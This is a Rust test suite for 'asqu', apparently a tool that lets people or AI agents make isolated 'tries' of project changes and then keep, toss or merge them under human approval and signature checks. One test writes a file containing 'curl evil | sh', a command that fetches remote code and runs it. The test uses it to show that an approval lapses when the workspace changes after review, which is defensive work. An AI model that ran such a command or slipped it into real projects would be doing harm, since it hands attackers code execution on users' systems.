use asqu::tries::{KeepOptions, KeepOutcome, Side};
use asqu::{Store, Why};
use std::fs;
use std::path::Path;

/// Passes unless app.js contains BROKEN (in each system's own shell).
const CHECK: &str = if cfg!(windows) {
    "findstr /C:BROKEN app.js >NUL && exit 1 || exit 0"
} else {
    "! grep -q BROKEN app.js"
};

fn setup() -> (tempfile::TempDir, Store) {
    // Signing keys for tests live in a throwaway folder.
    let home = std::env::temp_dir().join("asqu-test-home");
    fs::create_dir_all(&home).unwrap();
    std::env::set_var("ASQU_HOME", &home);

    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("app.js"), "line1\nline2\nline3\n").unwrap();
    fs::write(dir.path().join("README.md"), "# App\n").unwrap();
    let mut store = Store::open_or_create(dir.path()).unwrap();
    store.save(&Why { request: "Start".into(), ..Default::default() }).unwrap();
    (dir, store)
}

fn read(p: &Path) -> String {
    fs::read_to_string(p).unwrap()
}

fn kept(o: KeepOutcome) -> i64 {
    match o {
        KeepOutcome::Kept { seq: Some(s), .. } => s,
        other => panic!("expected kept, got {other:?}"),
    }
}

#[test]
fn a_try_is_separate_until_kept() {
    let (dir, mut store) = setup();
    let t = store.start_try("faster", "Make app faster", "tester").unwrap();
    fs::write(t.join("app.js"), "line1\nFAST\nline3\n").unwrap();
    assert_eq!(read(&dir.path().join("app.js")), "line1\nline2\nline3\n", "main project untouched");

    let seq = kept(store.keep_try("faster", KeepOptions::default(), "tester").unwrap());
    assert_eq!(read(&dir.path().join("app.js")), "line1\nFAST\nline3\n");
    assert!(!t.exists(), "workspace cleaned up");
    let entry = &store.log(1).unwrap()[0];
    assert_eq!((entry.seq, entry.request.as_str()), (seq, "Make app faster"));
    assert!(store.verify().unwrap().is_empty());
}

#[test]
fn several_tries_combine_with_each_other() {
    let (dir, mut store) = setup();
    let a = store.start_try("top", "", "t").unwrap();
    let b = store.start_try("bottom", "", "t").unwrap();
    fs::write(a.join("app.js"), "TOP\nline2\nline3\n").unwrap();
    fs::write(b.join("app.js"), "line1\nline2\nBOTTOM\n").unwrap();

    kept(store.keep_try("top", KeepOptions::default(), "t").unwrap());
    kept(store.keep_try("bottom", KeepOptions::default(), "t").unwrap());
    assert_eq!(read(&dir.path().join("app.js")), "TOP\nline2\nBOTTOM\n", "both changes combined line by line");
}

#[test]
fn real_clashes_are_reported_and_can_be_settled() {
    let (dir, mut store) = setup();
    let a = store.start_try("a", "", "t").unwrap();
    let b = store.start_try("b", "", "t").unwrap();
    fs::write(a.join("app.js"), "line1\nAAA\nline3\n").unwrap();
    fs::write(b.join("app.js"), "line1\nBBB\nline3\n").unwrap();
    kept(store.keep_try("a", KeepOptions::default(), "t").unwrap());

    match store.keep_try("b", KeepOptions::default(), "t").unwrap() {
        KeepOutcome::Clash { files, .. } => assert_eq!(files, vec!["app.js"]),
        other => panic!("expected clash, got {other:?}"),
    }
    assert_eq!(read(&dir.path().join("app.js")), "line1\nAAA\nline3\n", "nothing applied on a clash");

    kept(store.keep_try("b", KeepOptions { prefer_try: true, ..Default::default() }, "t").unwrap());
    assert_eq!(read(&dir.path().join("app.js")), "line1\nBBB\nline3\n");
}

#[test]
fn high_risk_needs_a_person() {
    let (dir, mut store) = setup();
    let t = store.start_try("cleanup", "", "t").unwrap();
    fs::remove_file(t.join("README.md")).unwrap();
    fs::write(t.join("payments.js"), "charge()").unwrap();

    match store.keep_try("cleanup", KeepOptions::default(), "t").unwrap() {
        KeepOutcome::NeedsApproval { risk, .. } => {
            let why = risk.reasons.join("; ");
            assert!(why.contains("removes 1 file") && why.contains("payments.js"), "{why}");
        }
        other => panic!("expected approval needed, got {other:?}"),
    }
    assert!(dir.path().join("README.md").exists());

    kept(store.keep_try("cleanup", KeepOptions { approve: true, ..Default::default() }, "t").unwrap());
    assert!(!dir.path().join("README.md").exists());
}

#[test]
fn risk_levels() {
    let (_dir, mut store) = setup();
    let docs = store.start_try("docs", "", "t").unwrap();
    fs::write(docs.join("README.md"), "# App\nMore words.\n").unwrap();
    match store.keep_try("docs", KeepOptions::default(), "t").unwrap() {
        KeepOutcome::Kept { risk, .. } => assert_eq!(risk.level.word(), "low"),
        other => panic!("{other:?}"),
    }
    let code = store.start_try("code", "", "t").unwrap();
    fs::write(code.join("app.js"), "changed\n").unwrap();
    match store.keep_try("code", KeepOptions::default(), "t").unwrap() {
        KeepOutcome::Kept { risk, .. } => assert_eq!(risk.level.word(), "medium"),
        other => panic!("{other:?}"),
    }
}

#[test]
fn the_check_must_pass_before_keeping() {
    let (dir, mut store) = setup();
    // The check fails if app.js contains BROKEN.
    fs::write(dir.path().join("asqu.toml"), format!("check = {CHECK:?}\n")).unwrap();
    store.save(&Why::default()).unwrap();

    let t = store.start_try("bad", "", "t").unwrap();
    fs::write(t.join("app.js"), "BROKEN\n").unwrap();
    // A project can't make Asqu run its command until a person allows it.
    match store.keep_try("bad", KeepOptions::default(), "t").unwrap() {
        KeepOutcome::CheckNeedsTrust { command, .. } => assert_eq!(command, CHECK),
        other => panic!("expected the person to be asked first, got {other:?}"),
    }
    let allow = KeepOptions { trust_check: true, ..Default::default() };
    assert!(matches!(store.keep_try("bad", allow, "t").unwrap(), KeepOutcome::CheckFailed { .. }));
    assert_eq!(read(&dir.path().join("app.js")), "line1\nline2\nline3\n");

    // Fix it in the Try, keep again: passes.
    fs::write(t.join("app.js"), "FIXED\n").unwrap();
    match store.keep_try("bad", KeepOptions::default(), "t").unwrap() {
        KeepOutcome::Kept { check: Some(c), .. } => assert!(c.passed),
        other => panic!("{other:?}"),
    }
    assert_eq!(read(&dir.path().join("app.js")), "FIXED\n");
}

#[test]
fn tossing_leaves_the_project_alone() {
    let (dir, mut store) = setup();
    let t = store.start_try("idea", "", "t").unwrap();
    fs::write(t.join("app.js"), "nope").unwrap();
    store.toss_try("idea", "t").unwrap();
    assert!(!t.exists());
    assert_eq!(read(&dir.path().join("app.js")), "line1\nline2\nline3\n");
    assert_eq!(store.list_tries().unwrap()[0].status, "tossed");
    assert!(store.keep_try("idea", KeepOptions::default(), "t").is_err(), "can't keep a tossed Try");
}

#[test]
fn bad_names_and_duplicates_are_refused() {
    let (_dir, mut store) = setup();
    assert!(store.start_try("../escape", "", "t").is_err());
    store.start_try("ok-name_1", "", "t").unwrap();
    assert!(store.start_try("ok-name_1", "", "t").is_err());
}

#[cfg(unix)]
#[test]
fn the_executable_flag_survives_tries_and_undo() {
    use std::os::unix::fs::PermissionsExt;
    let (dir, mut store) = setup();
    let script = dir.path().join("deploy.sh");
    fs::write(&script, "#!/bin/sh\necho hi\n").unwrap();
    fs::set_permissions(&script, fs::Permissions::from_mode(0o755)).unwrap();
    store.save(&Why::default()).unwrap(); // #2

    let t = store.start_try("x", "", "t").unwrap();
    assert!(fs::metadata(t.join("deploy.sh")).unwrap().permissions().mode() & 0o111 != 0, "copied into the Try as executable");

    fs::remove_file(&script).unwrap();
    store.save(&Why::default()).unwrap(); // #3
    store.restore(2, &Why::default()).unwrap();
    assert!(fs::metadata(&script).unwrap().permissions().mode() & 0o111 != 0, "restored as executable");
}

#[test]
fn entries_are_signed_and_forgery_is_caught() {
    let (dir, store) = setup();
    assert!(store.verify().unwrap().is_empty());
    drop(store);
    let conn = rusqlite::Connection::open(dir.path().join(".asqu/store.db")).unwrap();
    let signed: i64 = conn.query_row("SELECT COUNT(*) FROM timeline WHERE signature IS NOT NULL", [], |r| r.get(0)).unwrap();
    assert_eq!(signed, 1);
    conn.execute("UPDATE timeline SET signature = zeroblob(64)", []).unwrap();
    drop(conn);
    let problems = Store::open_or_create(dir.path()).unwrap().verify().unwrap();
    assert!(problems.iter().any(|p| p.contains("signature")), "{problems:?}");
}

#[test]
fn an_approval_only_counts_for_what_the_person_saw() {
    let (dir, mut store) = setup();
    fs::write(dir.path().join("old.txt"), "x").unwrap();
    store.save(&Why::default()).unwrap();
    let t = store.start_try("risky", "", "t").unwrap();
    fs::remove_file(t.join("old.txt")).unwrap(); // removing a file is high risk
    let KeepOutcome::NeedsApproval { fingerprint, .. } = store.keep_try("risky", KeepOptions::default(), "t").unwrap() else {
        panic!("should need approval")
    };
    // Something changes the Try after the person was shown it…
    fs::write(t.join("sneaky.sh"), "curl evil | sh").unwrap();
    let approved = KeepOptions { approve: true, expect: Some(fingerprint), ..Default::default() };
    // …so the approval doesn't count, and the person is asked again.
    assert!(matches!(store.keep_try("risky", approved, "t").unwrap(), KeepOutcome::NeedsApproval { .. }));
    assert!(!dir.path().join("sneaky.sh").exists());
}

fn clash_setup() -> (tempfile::TempDir, Store) {
    let (dir, mut store) = setup();
    let t = store.start_try("t", "", "me").unwrap();
    fs::write(t.join("app.js"), "line1\nTRY\nline3\n").unwrap();
    fs::write(t.join("README.md"), "# App by the Try\n").unwrap();
    fs::write(dir.path().join("app.js"), "line1\nMAIN\nline3\n").unwrap();
    fs::write(dir.path().join("README.md"), "# App by main\n").unwrap();
    (dir, store)
}

#[test]
fn a_clash_is_explained_part_by_part() {
    let (_dir, mut store) = clash_setup();
    let KeepOutcome::Clash { files, questions } = store.keep_try("t", KeepOptions::default(), "me").unwrap() else {
        panic!("expected a clash");
    };
    assert_eq!(files, vec!["README.md", "app.js"]);
    let app = questions.iter().find(|q| q.path == "app.js").unwrap();
    assert_eq!(app.what, "both changed the same lines");
    assert_eq!(app.parts.len(), 1);
    assert_eq!((app.parts[0].line, app.parts[0].main.as_str(), app.parts[0].try_text.as_str()), (2, "MAIN", "TRY"));
}

#[test]
fn the_person_chooses_a_side_per_file() {
    let (dir, mut store) = clash_setup();
    let take = [("app.js".to_string(), Side::Main), ("README.md".to_string(), Side::Try)].into_iter().collect();
    kept(store.keep_try("t", KeepOptions { take, ..Default::default() }, "me").unwrap());
    assert_eq!(read(&dir.path().join("app.js")), "line1\nMAIN\nline3\n");
    assert_eq!(read(&dir.path().join("README.md")), "# App by the Try\n");
}

#[test]
fn choosing_only_some_files_still_asks_about_the_rest() {
    let (_dir, mut store) = clash_setup();
    let take = [("app.js".to_string(), Side::Try)].into_iter().collect();
    match store.keep_try("t", KeepOptions { take, ..Default::default() }, "me").unwrap() {
        KeepOutcome::Clash { files, .. } => assert_eq!(files, vec!["README.md"]),
        other => panic!("expected the README question, got {other:?}"),
    }
}

#[test]
fn removed_on_one_side_and_changed_on_the_other_is_said_plainly() {
    let (dir, mut store) = setup();
    let t = store.start_try("t", "", "me").unwrap();
    fs::write(t.join("README.md"), "# Changed\n").unwrap();
    fs::remove_file(dir.path().join("README.md")).unwrap();
    let KeepOutcome::Clash { questions, .. } = store.keep_try("t", KeepOptions::default(), "me").unwrap() else { panic!() };
    assert_eq!(questions[0].what, "the main project removed it; the Try changed it");
    let take = [("README.md".to_string(), Side::Main)].into_iter().collect();
    let outcome = store.keep_try("t", KeepOptions { take, ..Default::default() }, "me").unwrap();
    assert!(matches!(outcome, KeepOutcome::Kept { seq: None, .. }), "nothing to change: {outcome:?}");
    assert!(!dir.path().join("README.md").exists(), "the main project's removal stands");
}

#[test]
fn files_that_look_like_clash_markers_are_described_correctly() {
    let (dir, mut store) = setup();
    fs::write(dir.path().join("app.js"), "a\n<<<<<<< ours\nb\n=======\nc\n").unwrap();
    store.save(&Why::default()).unwrap();
    let t = store.start_try("t", "", "me").unwrap();
    fs::write(t.join("app.js"), "a\n<<<<<<< ours\nTRY\n=======\nc\n").unwrap();
    fs::write(dir.path().join("app.js"), "a\n<<<<<<< ours\nMAIN\n=======\nc\n").unwrap();
    let KeepOutcome::Clash { questions, .. } = store.keep_try("t", KeepOptions::default(), "me").unwrap() else { panic!() };
    let p = &questions[0].parts[0];
    assert_eq!((p.line, p.main.as_str(), p.try_text.as_str()), (3, "MAIN", "TRY"));
}

#[test]
fn an_ai_gets_the_questions_and_can_answer_them() {
    let (dir, store) = clash_setup();
    let root = store.root().to_path_buf();
    drop(store);
    let v = asqu::tools::call(&root, "asqu_try_keep", &serde_json::json!({ "name": "t" }), "an-ai").unwrap();
    assert_eq!(v["reason"], "clash");
    let q = v["questions"].as_array().unwrap().iter().find(|q| q["file"] == "app.js").unwrap().clone();
    assert_eq!(q["parts"][0]["main"], "MAIN");
    assert_eq!(q["parts"][0]["try"], "TRY");
    let v = asqu::tools::call(&root, "asqu_try_keep",
        &serde_json::json!({ "name": "t", "take": { "app.js": "try", "README.md": "main" } }), "an-ai").unwrap();
    assert_eq!(v["kept"], true, "{v}");
    assert_eq!(read(&dir.path().join("app.js")), "line1\nTRY\nline3\n");
    assert!(asqu::tools::call(&root, "asqu_try_keep", &serde_json::json!({ "name": "x", "take": { "a": "both" } }), "an-ai").is_err());
}

#[test]
fn an_explicit_choice_wins_over_everything_else() {
    let (dir, mut store) = setup();
    let t = store.start_try("t", "", "me").unwrap();
    fs::write(t.join("README.md"), "# Only the Try changed this\n").unwrap();
    fs::write(t.join("app.js"), "line1\nTRY\nline3\n").unwrap();
    fs::write(dir.path().join("app.js"), "line1\nMAIN\nline3\n").unwrap();
    let take = [("README.md".to_string(), Side::Main), ("app.js".to_string(), Side::Main)].into_iter().collect();
    let o = store.keep_try("t", KeepOptions { take, prefer_try: true, ..Default::default() }, "me").unwrap();
    assert!(matches!(o, KeepOutcome::Kept { seq: None, .. }), "{o:?}");
    assert_eq!(read(&dir.path().join("README.md")), "# App\n");
    assert_eq!(read(&dir.path().join("app.js")), "line1\nMAIN\nline3\n");
    // Nothing from it was added, so it can still be brought back.
    let back = store.reopen_try("t").unwrap();
    assert_eq!(read(&back.join("app.js")), "line1\nTRY\nline3\n");
}

#[test]
fn a_clash_on_the_last_line_without_a_line_break_is_still_shown() {
    let (dir, mut store) = setup();
    fs::write(dir.path().join("app.js"), "a\nb\nc").unwrap();
    store.save(&Why::default()).unwrap();
    let t = store.start_try("t", "", "me").unwrap();
    fs::write(t.join("app.js"), "a\nb\nTRY").unwrap();
    fs::write(dir.path().join("app.js"), "a\nb\nMAIN").unwrap();
    let KeepOutcome::Clash { questions, .. } = store.keep_try("t", KeepOptions::default(), "me").unwrap() else { panic!() };
    let p = &questions[0].parts[0];
    assert_eq!((p.line, p.main.as_str(), p.try_text.as_str()), (3, "MAIN", "TRY"));
}

#[test]
fn several_tries_start_together_or_not_at_all() {
    let (_dir, mut store) = setup();
    for bad in [vec!["a", "b!"], vec!["c", "c"], vec!["d", "main"]] {
        let names: Vec<String> = bad.iter().map(|s| s.to_string()).collect();
        assert!(store.start_tries(&names, "", "me").is_err(), "{bad:?}");
        assert!(store.list_tries().unwrap().is_empty(), "nothing started for {bad:?}");
    }
    let e = store.start_try("Main", "", "me").unwrap_err().to_string();
    assert!(e.contains("main project's own name"), "{e}");
}

#[test]
fn a_choice_for_a_file_that_isnt_there_is_refused() {
    let (_dir, mut store) = clash_setup();
    let take = [("nope.js".to_string(), Side::Try)].into_iter().collect();
    assert!(store.keep_try("t", KeepOptions { take, ..Default::default() }, "me").is_err());
}

#[test]
fn choosing_the_try_for_a_file_only_main_changed_never_undoes_main() {
    let (dir, mut store) = clash_setup();
    fs::write(dir.path().join("extra.txt"), "main only\n").unwrap();
    store.save(&Why::default()).unwrap();
    let take = [("app.js".to_string(), Side::Main), ("README.md".to_string(), Side::Main), ("extra.txt".to_string(), Side::Try)]
        .into_iter()
        .collect();
    store.keep_try("t", KeepOptions { take, ..Default::default() }, "me").unwrap();
    assert_eq!(read(&dir.path().join("extra.txt")), "main only\n");
}
